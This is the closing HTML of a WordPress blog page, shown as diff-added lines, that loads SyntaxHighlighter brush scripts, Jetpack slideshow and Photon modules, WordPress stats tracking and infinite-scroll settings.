+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPlain.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPowerShell.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPython.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/third-party-brushes/shBrushR.js?ver=20100919'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushRuby.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushScala.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushSql.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushVb.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushXml.js?ver=3.0.83c'></script>
+<script type='text/javascript'>
+	(function(){
+		var corecss = document.createElement('link');
+		var themecss = document.createElement('link');
+		var corecssurl = "http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.83c";
+		if ( corecss.setAttribute ) {
+				corecss.setAttribute( "rel", "stylesheet" );
+				corecss.setAttribute( "type", "text/css" );
+				corecss.setAttribute( "href", corecssurl );
+		} else {
+				corecss.rel = "stylesheet";
+				corecss.href = corecssurl;
+		}
+		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
+		var themecssurl = "http://isisblogs.poly.edu/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?ver=3.0.83c";
+		if ( themecss.setAttribute ) {
+				themecss.setAttribute( "rel", "stylesheet" );
+				themecss.setAttribute( "type", "text/css" );
+				themecss.setAttribute( "href", themecssurl );
+		} else {
+				themecss.rel = "stylesheet";
+				themecss.href = themecssurl;
+		}
+		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
+		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
+	})();
+	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
+	SyntaxHighlighter.config.strings.help = '?';
+	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
+	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
+	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
+	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
+	SyntaxHighlighter.defaults['toolbar'] = false;
+	SyntaxHighlighter.all();
+</script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/jetpack/modules/shortcodes/js/jquery.cycle.js?ver=2.9999.8'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var jetpackSlideshowSettings = {"spinner":"http:\/\/isisblogs.poly.edu\/wp-content\/plugins\/jetpack\/modules\/shortcodes\/img\/slideshow-loader.gif"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/jetpack/modules/shortcodes/js/slideshow-shortcode.js?ver=20121214.1'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/jetpack/modules/photon/photon.js?ver=20130122'></script>
+<script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201308'></script>
+
+	<script src="http://stats.wordpress.com/e-201308.js" type="text/javascript"></script>
+	<script type="text/javascript">
+	st_go({v:'ext',j:'1:2.1.2',blog:'2555824',post:'0',tz:'-5'});
+	var load_cmc = function(){linktracker_init(2555824,0,2);};
+	if ( typeof addLoadEvent != 'undefined' ) addLoadEvent(load_cmc);
+	else load_cmc();
+	</script><script type="text/javascript">
+			jQuery.extend( infiniteScroll.settings.scripts, ["jquery","the-neverending-homepage","swfobject","videopress","spin","jquery.spin","syntaxhighlighter-core","syntaxhighlighter-brush-as3","syntaxhighlighter-brush-bash","syntaxhighlighter-brush-coldfusion","syntaxhighlighter-brush-clojure","syntaxhighlighter-brush-cpp","syntaxhighlighter-brush-csharp","syntaxhighlighter-brush-css","syntaxhighlighter-brush-delphi","syntaxhighlighter-brush-diff","syntaxhighlighter-brush-erlang","syntaxhighlighter-brush-fsharp","syntaxhighlighter-brush-groovy","syntaxhighlighter-brush-java","syntaxhighlighter-brush-javafx","syntaxhighlighter-brush-jscript","syntaxhighlighter-brush-latex","syntaxhighlighter-brush-matlabkey","syntaxhighlighter-brush-objc","syntaxhighlighter-brush-perl","syntaxhighlighter-brush-php","syntaxhighlighter-brush-plain","syntaxhighlighter-brush-powershell","syntaxhighlighter-brush-python","syntaxhighlighter-brush-r","syntaxhighlighter-brush-ruby","syntaxhighlighter-brush-scala","syntaxhighlighter-brush-sql","syntaxhighlighter-brush-vb","syntaxhighlighter-brush-xml","jquery-cycle","jetpack-slideshow","jetpack-photon","devicepx"] );
+			jQuery.extend( infiniteScroll.settings.styles, ["the-neverending-homepage","jetpack-slideshow","jetpack-widgets","infinity-twentyten","sharedaddy"] );
+		</script></body>
+</html>
